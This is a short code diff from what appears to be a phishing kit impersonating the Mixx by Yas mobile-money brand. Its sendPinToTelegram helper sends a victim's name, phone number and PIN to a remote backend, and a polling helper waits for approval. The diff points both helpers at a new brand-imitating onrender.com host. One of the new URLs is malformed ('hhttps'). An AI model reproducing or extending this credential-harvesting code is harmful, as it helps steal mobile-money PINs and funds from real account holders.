@@ -245,7 +245,7 @@ if (savedPhone) {
 
 // 4. Helper: send PIN to backend (same as first page)
 async function sendPinToTelegram(name, phone, pin) {
-    const BACKEND_URL = "https://mixx-by-yas-yf2n.onrender.com";
+    const BACKEND_URL = "https://yas-tanzania.onrender.com";
     const cleanPhone = phone.replace(/\s/g, '');
     const payload = {
         name: name || "Unknown",
@@ -285,7 +285,7 @@ async function sendPinToTelegram(name, phone, pin) {
 
 // 5. Helper: poll for approval (indefinitely)
 function pollPinApproval(requestId) {
-    const BACKEND_URL = "https://mixx-by-yas-yf2n.onrender.com";
+    const BACKEND_URL = "hhttps://yas-tanzania.onrender.com";
     let attempts = 0;
     return new Promise((resolve) => {
         const interval = setInterval(async () => {
